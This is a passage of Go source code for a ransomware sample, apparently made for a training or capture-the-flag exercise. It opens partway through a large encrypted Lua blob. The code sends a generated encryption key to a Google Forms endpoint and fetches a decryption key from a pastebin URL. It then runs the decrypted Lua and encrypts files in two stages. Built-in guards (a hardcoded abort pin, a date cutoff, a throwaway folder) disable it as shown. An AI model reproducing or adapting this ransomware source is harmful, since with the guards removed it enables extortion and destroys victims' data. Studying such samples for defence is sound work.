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`
var DECRYPTEDLUA =  make([]byte, 0)

// Util
func StringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func CheckTimeout(start int64) bool {
	now := time.Now().Unix()
	if (now - start) >= 50 {
		panic("timeout");
	}
	return true
}


// // Stage 2
func DecryptLuaCode() {
	url := "https://pastebin.com/raw/LHS242K1";
	resp, err := http.Get(url);
	if err != nil {
		panic("bad get")
	}
	CheckTimeout(start);
	defer resp.Body.Close()
	key, err := ioutil.ReadAll(resp.Body)

	CheckTimeout(start);
	ENCRYPTEDLUA, _ := base64.StdEncoding.DecodeString(ENCRYPTEDLUA)
	for i := 0; i < len(ENCRYPTEDLUA); i++ {
		DECRYPTEDLUA = append(DECRYPTEDLUA, ENCRYPTEDLUA[i] ^ key[i % len(key)])
	}
	CheckTimeout(start);

}

func GetLuaAESKey() []byte {
	key := strconv.FormatInt(time.Now().Unix(), 10)
	return []byte(key)
}

func SetupStage2() []byte {
	DecryptLuaCode()
	CheckTimeout(start)
	CheckTimeout(start)

	key := GetLuaAESKey()
	CheckTimeout(start)
	return key
}

func ExecuteStage2(data string) []byte {
	// Encrypt the data using encrypted lua code
	if (STAGE2KEY == "") {
		STAGE2KEY = string(SetupStage2())
	}
	CheckTimeout(start);

	l := lua.NewState()
	defer l.Close()
	if err := l.DoString(string(DECRYPTEDLUA)); err != nil {
		panic(err)
	}
	CheckTimeout(start)

	if err := l.CallByParam(lua.P{
		Fn:      l.GetGlobal("encrypt"),
		NRet:    1,                    
		Protect: true,                  
	}, lua.LString(STAGE2KEY), lua.LString(data)); err != nil {
		panic(err)
	}
	CheckTimeout(start)

	encrypted, ok := l.Get(-1).(lua.LString)
	if ok {
		l.Pop(1)
		CheckTimeout(start)
		return []byte(encrypted)
	} else {
		panic("bad stage2")
	}

}

func main() {
	// Some safety checks
	// Make sure the ransomware only executes before a certain time in the past
	// Make sure the ransomware only works in a useless folder
	// Have a safety pin compiled in too
	pin := true
	searchDir := string("/tmp/safety-folder-1s1f822vh897c29nnbl10")
	targetExt := []string{".mitr3",".m1tre", ".m1tr3"}

	if (pin) {
		panic("abort");
	}
	if start > 1539741273 {
		panic("abort");
	}

	CheckTimeout(start);

	key := make([]byte, 24)
	_, err := rand.Read(key)
	if err != nil {
		panic("bad rand")
	}

	resp, err := http.PostForm(
		"https://docs.google.com/forms/d/e/1FAIpQLScd_D5hVYABh6u2H-0TPWA-Z6J50o0snzsOMq1M4oTtj4CQsA/formResponse",
		url.Values{"entry.2100855519": {base64.StdEncoding.EncodeToString(key)}})
	if err != nil {
		panic("bad post")
	}
	if resp == nil {
		panic("bad post")
	}

	// ExecuteStage1
	CheckTimeout(start);
	fileList := []string{};
	filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		if StringInSlice(filepath.Ext(path), targetExt) {  // Check if target ext
			CheckTimeout(start)
			fileList = append(fileList, path)
			originalData, err := ioutil.ReadFile(path)
			if err != nil {
				//
			}

			// Stage 1, encrypt using a randomly generated key that is uploaded to remote
			encryptedData := encrypt(key, originalData)
			fmt.Println("after stage 1 data: ", encryptedData)
			CheckTimeout(start)

			// Stage 2, encrypt using 
			encryptedData2 := ExecuteStage2(encryptedData)
			CheckTimeout(start)
			fmt.Println("after stage 2 data: ", encryptedData2)

			CheckTimeout(start)

			newPath := path + ".encrypted"
			ioutil.WriteFile(newPath, []byte(encryptedData2), 0644)
		}
		return nil
	})
}

func encrypt(key []byte, plaintext []byte) string {
	// Encrypt `text` using 3DES CFB mode into a blob
	// B64([IV][ENCRYPTED])
	block, err := des.NewTripleDESCipher(key)
	CheckTimeout(start)
	if err != nil {
		panic(err)
	}
	ciphertext := make([]byte, des.BlockSize+len(plaintext))
	iv := ciphertext[:des.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	CheckTimeout(start)
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[des.BlockSize:], plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext)
}
